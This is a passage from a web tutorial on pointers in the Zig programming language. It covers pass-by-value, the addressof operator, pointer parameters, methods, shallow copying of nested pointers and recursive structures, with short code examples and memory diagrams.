                    <button id="flexsearch-button" class="ms-3 btn btn-soft" data-bs-toggle="collapse" data-bs-target="#FlexSearchCollapse" aria-expanded="false" aria-controls="FlexSearchCollapse">
                        <span class="material-icons size-20 menu-icon align-middle">search</span>
                        <span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span>
                        <div class="d-none d-sm-block">
                            <span class="flexsearch-button-keys">
                                <kbd class="flexsearch-button-cmd-key">
                                    <svg width="44" height="15"><path d="M2.118,11.5A1.519,1.519,0,0,1,1,11.042,1.583,1.583,0,0,1,1,8.815a1.519,1.519,0,0,1,1.113-.458h.715V6.643H2.118A1.519,1.519,0,0,1,1,6.185,1.519,1.519,0,0,1,.547,5.071,1.519,1.519,0,0,1,1,3.958,1.519,1.519,0,0,1,2.118,3.5a1.519,1.519,0,0,1,1.114.458A1.519,1.519,0,0,1,3.69,5.071v.715H5.4V5.071A1.564,1.564,0,0,1,6.976,3.5,1.564,1.564,0,0,1,8.547,5.071,1.564,1.564,0,0,1,6.976,6.643H6.261V8.357h.715a1.575,1.575,0,0,1,1.113,2.685,1.583,1.583,0,0,1-2.227,0A1.519,1.519,0,0,1,5.4,9.929V9.214H3.69v.715a1.519,1.519,0,0,1-.458,1.113A1.519,1.519,0,0,1,2.118,11.5Zm0-.857a.714.714,0,0,0,.715-.714V9.214H2.118a.715.715,0,1,0,0,1.429Zm4.858,0a.715.715,0,1,0,0-1.429H6.261v.715a.714.714,0,0,0,.715.714ZM3.69,8.357H5.4V6.643H3.69ZM2.118,5.786h.715V5.071a.714.714,0,0,0-.715-.714.715.715,0,0,0-.5,1.22A.686.686,0,0,0,2.118,5.786Zm4.143,0h.715a.715.715,0,0,0,.5-1.22.715.715,0,0,0-1.22.5Z" fill="currentColor"></path><path d="M12.4,11.475H11.344l3.879-7.95h1.056Z" fill="currentColor"></path><path d="M25.073,5.384l-.864.576a2.121,2.121,0,0,0-1.786-.923,2.207,2.207,0,0,0-2.266,2.326,2.206,2.206,0,0,0,2.266,2.325,2.1,2.1,0,0,0,1.782-.918l.84.617a3.108,3.108,0,0,1-2.622,1.293,3.217,3.217,0,0,1-3.349-3.317,3.217,3.217,0,0,1,3.349-3.317A3.046,3.046,0,0,1,25.073,5.384Z" fill="currentColor"></path><path d="M30.993,5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172Z" fill="currentColor"></path><path d="M34.67,4.164c1.471,0,2.266.658,2.266,1.851,0,1.087-.832,1.809-2.134,1.855l2.107,2.691h-1.28L33.591,7.87H33.07v2.691H32.038v-6.4Zm-1.6.969v1.8h1.572c.832,0,1.22-.3,1.22-.918s-.411-.882-1.22-.882Z" fill="currentColor"></path><path d="M42.883,10.561H38.31v-6.4h1.033V9.583h3.54Z" fill="currentColor"></path></svg>
                                </kbd>
                                <kbd class="flexsearch-button-key">
                                    <svg width="15" height="15"><path d="M5.926,12.279H4.41L9.073,2.721H10.59Z" fill="currentColor"/></svg>
                                </kbd>
                            </span>
                        </div>
                    </button>
                
            </div>

        <div class="d-flex align-items-center">
            <ul class="list-unstyled mb-0">
                
            </ul>
            <button id="mode" class="btn btn-icon btn-default ms-2" type="button" aria-label="Toggle user interface mode">
                <span class="toggle-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
                        <title>Enable dark mode</title>
                        <path d="M24 42q-7.5 0-12.75-5.25T6 24q0-7.5 5.25-12.75T24 6q.4 0 .85.025.45.025 1.15.075-1.8 1.6-2.8 3.95-1 2.35-1 4.95 0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6 0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42Zm0-3q5.45 0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75 0-9.775-4.025T19.2 15q0-1.2.25-2.575.25-1.375.9-3.125-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39Zm-.2-14.85Z"/>
                    </svg>
                </span>
                <span class="toggle-light">
                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
                        <title>Enable light mode</title>
                        <path d="M24 31q2.9 0 4.95-2.05Q31 26.9 31 24q0-2.9-2.05-4.95Q26.9 17 24 17q-2.9 0-4.95 2.05Q17 21.1 17 24q0 2.9 2.05 4.95Q21.1 31 24 31Zm0 3q-4.15 0-7.075-2.925T14 24q0-4.15 2.925-7.075T24 14q4.15 0 7.075 2.925T34 24q0 4.15-2.925 7.075T24 34ZM3.5 25.5q-.65 0-1.075-.425Q2 24.65 2 24q0-.65.425-1.075Q2.85 22.5 3.5 22.5h5q.65 0 1.075.425Q10 23.35 10 24q0 .65-.425 1.075-.425.425-1.075.425Zm36 0q-.65 0-1.075-.425Q38 24.65 38 24q0-.65.425-1.075.425-.425 1.075-.425h5q.65 0 1.075.425Q46 23.35 46 24q0 .65-.425 1.075-.425.425-1.075.425ZM24 10q-.65 0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 10 24 10Zm0 36q-.65 0-1.075-.425-.425-.425-.425-1.075v-5q0-.65.425-1.075Q23.35 38 24 38q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46ZM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05 0 .6-.4 1-.4.45-1.025.45-.625 0-1.075-.4Zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45ZM33.9 14.1q-.45-.45-.45-1.05 0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4-.625 0-1.075-.4ZM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6 0 1.05.45.45.45.45 1.05 0 .6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425ZM24 24Z"/>
                    </svg>
                </span>
            </button>
            
        </div>
    </div>
    
    
            <div class="collapse" id="FlexSearchCollapse">
                <div class="flexsearch-container">
                    <div class="flexsearch-keymap">
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to navigate</span>
                        </li>
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to select</span>
                        </li>
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to close</span>
                        </li>
                    </div>
                    <form class="flexsearch position-relative flex-grow-1 ms-2 me-2">
                        <div class="d-flex flex-row">
                            <input id="flexsearch" class="form-control" type="search" placeholder="Search" aria-label="Search" autocomplete="off">
                            <button id="hideFlexsearch" type="button" class="ms-2 btn btn-soft">
                                cancel
                            </button>
                        </div>
                        <div id="suggestions" class="shadow rounded-1 d-none"></div>
                    </form>
                </div>
            </div>
        
    
    
</div>
<div class="container-fluid">
                            <div class="layout-spacing">
                                
                                    <div class="d-md-flex justify-content-between align-items-center"><nav aria-label="breadcrumb" class="d-inline-block pb-2 mt-1 mt-sm-0">
    <ul id="breadcrumbs" class="breadcrumb bg-transparent mb-0" itemscope itemtype="https://schema.org/BreadcrumbList">
        
            
                <li class="breadcrumb-item text-capitalize active" aria-current="page" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                    <a itemprop="item" href="/tutorials/docs/">
                        <i class="material-icons size-20 align-text-bottom" itemprop="name">Home</i>
                    </a>
                    <meta itemprop="position" content='1' />
                </li>
            
            
                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                    <a itemprop="item" href="/tutorials/docs/zig/">
                        <span itemprop="name">Zig</span>
                    </a>
                    <meta itemprop="position" content='2' />
                </li>
            
        
            <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                <span itemprop="name">Pointers in Zig</span>
                <meta itemprop="position" content='3' />
            </li>
        
    </ul>
</nav></div>
                                
                                <div class="row flex-xl-nowrap">
                                    
                                    <div class="docs-toc col-xl-3    d-xl-block"><toc>
    <div class="fw-bold text-uppercase mb-2">On this page</div>
    <nav id="toc">
  <ul>
    <li>
      <ul>
        <li><a href="#pointers">Pointers</a></li>
        <li><a href="#methods">Methods</a></li>
        <li><a href="#constant-function-parameters">Constant Function Parameters</a></li>
        <li><a href="#nested-pointers">Nested Pointers</a></li>
        <li><a href="#recursive-structures">Recursive Structures</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </toc></div>
                                    
                                    
                                    <div class="docs-toc-mobile    d-print-none d-xl-none">
                                        <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
                                            Table of Contents
                                        </button>
<nav id="toc-mobile">
  <ul class="dropdown-menu">
    <li>
      <ul>
        <li><a href="#pointers">Pointers</a></li>
        <li><a href="#methods">Methods</a></li>
        <li><a href="#constant-function-parameters">Constant Function Parameters</a></li>
        <li><a href="#nested-pointers">Nested Pointers</a></li>
        <li><a href="#recursive-structures">Recursive Structures</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
                                    <div class="docs-content col-12 col-xl-9 mt-0">
                                        <div class="mb-0 d-flex">
                                            
                                            <i class="material-icons title-icon me-2">code</i>
                                            
                                            <h1 class="content-title mb-0">
                                                Pointers in Zig
                                                
                                            </h1>
                                        </div>
                                        
                                            <p class="lead mb-3">Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.</p>
                                        
                                        <div id="content" class="main-content" data-bs-spy="scroll" data-bs-root-margin="0px 0px -65%" data-bs-target="#toc-mobile">
                                            
    
    <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
        <h2 id="pointers">Pointers <a href="#pointers" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>Zig doesn&rsquo;t include a garbage collector. The burden of managing memory is on you, the developer. It&rsquo;s a big responsibility as it has a direct impact on the performance, stability and security of your application.</p>
<p>We&rsquo;ll begin by talking about pointers, which is an important topic to discuss in and of itself, but also to start training ourselves to see our program&rsquo;s data from a memory-oriented point of view. If you&rsquo;re already comfortable with pointers, heap allocations and dangling pointers, feel free to skip ahead a couple of parts to heap memory &amp; allocators, which is more Zig-specific.</p>
<p>The following code creates a user with a <code>power</code> of 100, and then calls the <code>levelUp</code> function which increments the user&rsquo;s power by 1. Can you guess the output?</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="cc332a5" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	var user = User{
		.id = 1,
		.power = 100,
	};

	// this line has been added
	levelUp(user);
	std.debug.print(&#34;User {d} has power of {d}\n&#34;, .{user.id, user.power});
}

fn levelUp(user: User) void {
	user.power &#43;= 1;
}

pub const User = struct {
	id: u64,
	power: i32,
};</code>
  </pre>
  </div>
<p>That was a unkind trick; the code won&rsquo;t compile: local variable is never mutated. This is in reference to the user variable in main. A variable that is never mutated must be declare const. You might be thinking: but in levelUp we are mutating user, what gives? Let&rsquo;s assume the Zig compiler is mistaken and trick it. We&rsquo;ll force the compiler to see that user is mutated:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="c738c99" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	var user = User{
		.id = 1,
		.power = 100,
	};
	user.power &#43;= 0;

	// rest of the code is the same</code>
  </pre>
  </div>
<p>Now we get an error in levelUp: cannot assign to constant. We saw in part 1 that function parameters are constants, thus user.power += 1; is not valid. To fix the compile-time error, we could change the levelUp function to:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="278c84c" class="language-zig ">
  <code>fn levelUp(user: User) void {
	var u = user;
	u.power &#43;= 1;
}</code>
  </pre>
  </div>
<p>Which will compile, but our output is User 1 has power of 100, even though the intent of our code is clearly for levelUp to increase the user&rsquo;s power to 101. What&rsquo;s happening?</p>
<p>To understand, it helps to think about data with respect to memory, and variables as labels that associate a type with a specific memory location. For example, in main, we create a User. A simple visualization of this data in memory would be:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="3faeaf2" class="language-zig ">
  <code>user -&gt; ------------ (id)
        |    1     |
        ------------ (power)
        |   100    |
        ------------</code>
  </pre>
  </div>
<p>There are two important things to note. The first is that our user variable points to the beginning of our structure. The second is that the fields are laid out sequentially. Remember that our user also has a type. That type tells us that id is a 64 bit integer and power is a 32 bit integer. Armed with a reference to the start of our data and the type, the compiler can translate user.power to: access a 32 bit integer located 64 bits from the beginning. That&rsquo;s the power of variables, they reference memory and include the type information necessary to understand and manipulate the memory in a meaningful way.</p>
<p>By default, Zig doesn&rsquo;t make guarantees about the memory layout of structures. It could store fields in alphabetical order, by ascending size, or with gaps. It can do what it wants, so long as it&rsquo;s able to translate our code correctly. This freedom can enable certain optimizations. Only if we declare a packed struct will we get strong guarantees about the memory layout. We can also create an extern struct which guarantees a that the memory layout will match the C Application Binary Interface (ABI). Still, our visualization of user is reasonable and useful.</p>
<p>Here&rsquo;s a slightly different visualization which includes memory addresses. The memory address of the start of this data is a random address I came up with. This is the memory address referenced by the user variable, which is also the value of our first field, id. However, given this initial address, all subsequent addresses have a known relative address. Since id is a 64 bit integer, it takes 8 bytes of memory. Therefore, power has to be at $start_address + 8:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="8ad5399" class="language-zig ">
  <code>user -&gt;   ------------  (id: 1043368d0)
          |    1     |
          ------------  (power: 1043368d8)
          |   100    |
          ------------</code>
  </pre>
  </div>
<p>To verify this for yourself, I&rsquo;d like to introduce the addressof operator: &amp;. As the name implies, the addressof operator returns the address of an variable (it can also return the address of a function, isn&rsquo;t that something?!). Keeping the existing User definition, try this main:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="d0d5559" class="language-zig ">
  <code>pub fn main() void {
	const user = User{
		.id = 1,
		.power = 100,
	};
	std.debug.print(&#34;{*}\n{*}\n{*}\n&#34;, .{&amp;user, &amp;user.id, &amp;user.power});
}</code>
  </pre>
  </div>
<p>This code prints the address of user, user.id and user.power. You might get different results based on your platform and other factors, but hopefully you&rsquo;ll see that the address of user and user.id are the same, while user.power is at an 8 byte offset. I got:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="7f77e10" class="language-zig ">
  <code>learning.User@1043368d0
u64@1043368d0
i32@1043368d8</code>
  </pre>
  </div>
<p>The addressof operator returns a pointer to a value. A pointer to a value is a distinct type. The address of a value of type T is a *T. We pronounce that a pointer to T. Therefore, if we take the address of user, we&rsquo;ll get a *User, or a pointer to User:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="3096f64" class="language-zig ">
  <code>pub fn main() void {
	var user = User{
		.id = 1,
		.power = 100,
	};
	user.power &#43;= 0;

	const user_p = &amp;user;
	std.debug.print(&#34;{any}\n&#34;, .{@TypeOf(user_p)});
}</code>
  </pre>
  </div>
<p>Our original goal was to increase our user&rsquo;s power by 1, via the levelUp function. We got the code to compile, but when we printed power it was still the original value. It&rsquo;s a bit of a leap, but let&rsquo;s change the code to print the address of user in main and in levelUp:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="ecb16a7" class="language-zig ">
  <code>pub fn main() void {
	var user = User{
		.id = 1,
		.power = 100,
	};
	user.power &#43;= 0;

	// added this
	std.debug.print(&#34;main: {*}\n&#34;, .{&amp;user});

	levelUp(user);
	std.debug.print(&#34;User {d} has power of {d}\n&#34;, .{user.id, user.power});
}

fn levelUp(user: User) void {
	// add this
	std.debug.print(&#34;levelUp: {*}\n&#34;, .{&amp;user});
	var u = user;
	u.power &#43;= 1;
}</code>
  </pre>
  </div>
<p>If you run this, you&rsquo;ll get two different addresses. This means that the user being modified in levelUp is different from the user in main. This happens because Zig passes a copy of the value. That might seem like a strange default, but one of the benefits is that the caller of a function can be sure that the function won&rsquo;t modify the parameter (because it can&rsquo;t). In a lot of cases, that&rsquo;s a good thing to have guaranteed. Of course, sometimes, like with levelUp, we want the function to modify a parameter. To achieve this, we need levelUp to act on the actual user in main, not a copy. We can do this by passing the address of our user into the function:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="e924b88" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	var user = User{
		.id = 1,
		.power = 100,
	};

	// no longer needed
	// user.power &#43;= 1;

	// user -&gt; &amp;user
	levelUp(&amp;user);
	std.debug.print(&#34;User {d} has power of {d}\n&#34;, .{user.id, user.power});
}

// User -&gt; *User
fn levelUp(user: *User) void {
	user.power &#43;= 1;
}

pub const User = struct {
	id: u64,
	power: i32,
};</code>
  </pre>
  </div>
<p>We had to make two changes. The first is calling levelUp with the address of user, i.e. &amp;user, instead of user. This means that our function no longer receives a User. Instead, it receives a *User, which was our second change.</p>
<p>We no longer need that ugly hack of forcing user to be mutated via user.power += 0;. Initially, we failed to get the code to compile because user was a var; the compiler told us it was never mutated. We thought maybe the compiler was wrong and &ldquo;tricked&rdquo; it by forcing a mutation. But, as we now know, the user being mutated in levelUp was a different; the compiler was right.</p>
<p>The code now works as intended. There are still many subtleties with function parameters and our memory model in general, but we&rsquo;re making progress. Now might be a good time to mention that, aside from the specific syntax, none of this is unique to Zig. The model that we&rsquo;re exploring here is the most common, some languages might just hide many of the details, and thus flexibility, from developers.</p>
<h2 id="methods">Methods <a href="#methods" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>More than likely, you&rsquo;d have written levelUp as a method of the User structure:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="f9c34f6" class="language-zig ">
  <code>pub const User = struct {
	id: u64,
	power: i32,

	fn levelUp(user: *User) void {
		user.power &#43;= 1;
	}
};</code>
  </pre>
  </div>
<p>This begs the question: how do we call a method with a pointer receiver? Maybe we have to do something like: &amp;user.levelUp()? Actually, you just call it normally, i.e. user.levelUp(). Zig knows that the method expects a pointer and passes the value correctly (by reference).</p>
<p>I initially chose a function because it&rsquo;s explicit and thus easier to learn from.</p>
<h2 id="constant-function-parameters">Constant Function Parameters <a href="#constant-function-parameters" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>I more than implied that, by default, Zig will pass a copy of a value (called &ldquo;pass by value&rdquo;). Shortly we&rsquo;ll see that the reality is a bit more subtle (hint: what about complex values with nested objects?)</p>
<p>Even sticking with simple types, the truth is that Zig can pass parameters however it wants, so long as it can guarantee that the intent of the code is preserved. In our original levelUp, where the parameter was a User, Zig could have passed a copy of the user or a reference to main.user, as long as it could guarantee that the function would not mutate it. (I know we ultimately did want it mutated, but by making the type User, we were telling the compiler that we didn&rsquo;t).</p>
<p>This freedom allows Zig to use the most optimal strategy based on the parameter type. Small types, like User, can be cheaply passed by value (i.e. copied). Larger types might be cheaper to pass by reference. Zig can use any approach, so long as the intent of the code is preserved. To some degree, this is made possible by having constant function parameters.</p>
<p>Now you know one of the reasons function parameters are constants.</p>
<p>Maybe you&rsquo;re wondering how passing by reference could ever be slower, even compared to copying a really small structure. We&rsquo;ll see this more clearly next, but the gist is that doing user.power when user is a pointer adds a tiny bit of overhead. The compiler has to weigh the cost of copying versus the cost of accessing fields indirectly through a pointer.
Pointer to Pointer
We previous looked at what the memory of user within our main function looked like. Now that we&rsquo;ve changed levelUp what would its memory look like?:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="1f71da7" class="language-bash ">
  <code>main:
user -&gt; ------------  (id: 1043368d0)  &lt;---
        |    1     |                      |
        ------------  (power: 1043368d8)  |
        |   100    |                      |
        ------------                      |
                                          |
        .............  empty space        |
        .............  or other data      |
                                          |
levelUp:                                  |
user -&gt; -------------  (*User)            |
        | 1043368d0 |----------------------
        -------------</code>
  </pre>
  </div>
<p>Within levelUp, user is a pointer to a User. Its value is an address. Not just any address, of course, but the address of main.user. It&rsquo;s worth being explicit that the user variable in levelUp represents a concrete value. This value happens to be an address. And, it&rsquo;s not just an address, it&rsquo;s also a type, a *User. It&rsquo;s all very consistent, it doesn&rsquo;t matter if we&rsquo;re talking about pointers or not: variables associate type information with an address. The only special thing about pointers is that, when we use the dot syntax, e.g. user.power, Zig, knowing that user is a pointer, will automatically follow the address.</p>
<p>Some languages require a different symbol when accessing a field through a pointer.
What&rsquo;s important to understand is that the user variable in levelUp itself exists in memory at some address. Just like we did before, we can see this for ourselves:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="3881366" class="language-zig ">
  <code>fn levelUp(user: *User) void {
	std.debug.print(&#34;{*}\n{*}\n&#34;, .{&amp;user, user});
	user.power &#43;= 1;
}</code>
  </pre>
  </div>
<p>The above prints the address the user variable references as well as its value, which is the address of the user in main.</p>
<p>If user is a *User, then what is &amp;user? It&rsquo;s a **User, or a pointer to a pointer to a User. I can do this until one of us runs out of memory!</p>
<p>There are use-cases for multiple levels of indirection, but is isn&rsquo;t anything we need right now. The purpose of this section is to show that pointers aren&rsquo;t special, they&rsquo;re just a value, which is an address, and a type.</p>
<h2 id="nested-pointers">Nested Pointers <a href="#nested-pointers" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>Up until now, our User has been simple, containing two integers. It&rsquo;s easy to visualize its memory and, when we talk about &ldquo;copying&rdquo;, there isn&rsquo;t any ambiguity. But what happens when User becomes more complex and contains a pointer?</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="37b1911" class="language-zig ">
  <code>pub const User = struct {
	id: u64,
	power: i32,
	name: []const u8,
};</code>
  </pre>
  </div>
<p>We&rsquo;ve added name which is a slice. Recall that a slice is a length and a pointer. If we initialized our user with the name of &ldquo;Goku&rdquo;, what would it look like in memory?</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="3da1edc" class="language-bash ">
  <code>user -&gt; -------------  (id: 1043368d0)
        |     1     |
        -------------  (power: 1043368d8)
        |    100    |
        -------------  (name.len: 1043368dc)
        |     4     |
        -------------  (name.ptr: 1043368e4)
  ------| 1182145c0 |
  |     -------------
  |
  |     .............  empty space
  |     .............  or other data
  |
  ---&gt;  -------------  (1182145c0)
        |    &#39;G&#39;    |
        -------------
        |    &#39;o&#39;    |
        -------------
        |    &#39;k&#39;    |
        -------------
        |    &#39;u&#39;    |
        -------------</code>
  </pre>
  </div>
<p>The new name field is a slice which is made up of a len and ptr field. These are laid out in sequence along with all the other fields. On a 64 bit platform both len and ptr will be 64 bits, or 8 bytes. The interesting part is the value of name.ptr: it&rsquo;s an address to some other place in memory.</p>
<p>Since we used a string literal, user.name.ptr will point to a specific location within the area where all the constants are stored inside our binary.
Types can get much more complex than this with deep nesting. But simple or complex, they all behave the same. Specifically, if we go back to our original code where levelUp took a plain User and Zig provided a copy, how would that look now that we have a nested pointer?</p>
<p>The answer is that only a shallow copy of the value is made. Or, as some put it, only the memory immediately addressable by the variable is copied. It might seem like levelUp would get a half-baked copy of user, possibly with an invalid name. But remember that a pointer, like our user.name.ptr is a value, and that value is an address. A copy of an address is still the same address:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="8846f59" class="language-zig ">
  <code>main: user -&gt;    -------------  (id: 1043368d0)
                 |     1     |
                 -------------  (power: 1043368d8)
                 |    100    |
                 -------------  (name.len: 1043368dc)
                 |     4     |
                 -------------  (name.ptr: 1043368e4)
                 | 1182145c0 |-------------------------
levelUp: user -&gt; -------------  (id: 1043368ec)       |
                 |     1     |                        |
                 -------------  (power: 1043368f4)    |
                 |    100    |                        |
                 -------------  (name.len: 1043368f8) |
                 |     4     |                        |
                 -------------  (name.ptr: 104336900) |
                 | 1182145c0 |-------------------------
                 -------------                        |
                                                      |
                 .............  empty space           |
                 .............  or other data         |
                                                      |
                 -------------  (1182145c0)        &lt;---
                 |    &#39;G&#39;    |
                 -------------
                 |    &#39;o&#39;    |
                 -------------
                 |    &#39;k&#39;    |
                 -------------
                 |    &#39;u&#39;    |
                 -------------</code>
  </pre>
  </div>
<p>From the above, we can see that shallow copying will work. Since a pointer&rsquo;s value is an address, copying the value means we get the same address. This has important implications with respect to mutability. Our function can&rsquo;t mutate the fields directly accessible by main.user since it got a copy, but it does have access to the same name, so can it mutate that? In this specific case, no, name is a const. Plus, our value &ldquo;Goku&rdquo; is a string literal which are always immutable. But, with a bit of work, we can see the implication of shallow copying:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="3a6ed57" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	var name = [4]u8{&#39;G&#39;, &#39;o&#39;, &#39;k&#39;, &#39;u&#39;};
	const user = User{
		.id = 1,
		.power = 100,
		// slice it, [4]u8 -&gt; []u8
		.name = name[0..],
	};
	levelUp(user);
	std.debug.print(&#34;{s}\n&#34;, .{user.name});
}

fn levelUp(user: User) void {
	user.name[2] = &#39;!&#39;;
}

pub const User = struct {
	id: u64,
	power: i32,
	// []const u8 -&gt; []u8
	name: []u8
};</code>
  </pre>
  </div>
<p>The above code prints &ldquo;Go!u&rdquo;. We had to change name&rsquo;s type from []const u8 to []u8 and instead of a string literal, which are always immutable, create an array and slice it. Some might see inconsistency here. Passing by value prevents a function from mutating immediate fields, but not fields with a value behind a pointer. If we did want name to be immutable, we should have declared it as a []const u8 instead of a []u8.</p>
<p>Some languages have a different implementation, but many languages work exactly like this (or very close). While all of this might seem esoteric, it&rsquo;s fundamental to day to day programming. The good news is that you can master this using simple examples and snippets; it doesn&rsquo;t get more complicated as other parts of the system grow in complexity.</p>
<h2 id="recursive-structures">Recursive Structures <a href="#recursive-structures" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>Sometimes you need a structure to be recursive. Keeping our existing code, let&rsquo;s add an optional manager of type ?User to our User. While we&rsquo;re at it, we&rsquo;ll create two Users and assign one as the manager to another:</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="de5cf36" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	const leto = User{
		.id = 1,
		.power = 9001,
		.manager = null,
	};

	const duncan = User{
		.id = 1,
		.power = 9001,
		.manager = leto,
	};

	std.debug.print(&#34;{any}\n{any}&#34;, .{leto, duncan});
}

pub const User = struct {
	id: u64,
	power: i32,
	manager: ?User,
};</code>
  </pre>
  </div>
<p>This code won&rsquo;t compile: struct &rsquo;learning.User&rsquo; depends on itself. This fails because every type has to have a known compile-time size.</p>
<p>We didn&rsquo;t run into this problem when we added name even though names can be different lengths. The issue isn&rsquo;t with the size of values, it&rsquo;s with the size of the types themselves. Zig needs this knowledge to do everything we talked about above, like accessing a field based on its offset position. name was a slice, a []const u8, and that has a known size: 16 bytes - 8 bytes for len and 8 bytes for ptr.</p>
<p>You might think this is going to be a problem with any optional or union. But for both optionals and unions, the largest possible size is known and Zig can use that. A recursive structure has no such upper-bound, the structure could recurse once, twice or millions of times. That number would vary from User to User and would not be known at compile time.</p>
<p>We saw the answer with name: use a pointer. Pointers always take usize bytes. On a 64-bit platform, that&rsquo;s 8 bytes. Just like the actual name &ldquo;Goku&rdquo; wasn&rsquo;t stored with/along our user, using a pointer means our manager is no longer tied to the user&rsquo;s memory layout.</p>



  
  
  

  
  
  
  

  

  <div class="prism-codeblock ">
  <pre id="023b001" class="language-zig ">
  <code>const std = @import(&#34;std&#34;);

pub fn main() void {
	const leto = User{
		.id = 1,
		.power = 9001,
		.manager = null,
	};

	const duncan = User{
		.id = 1,
		.power = 9001,
		// changed from leto -&gt; &amp;leto
		.manager = &amp;leto,
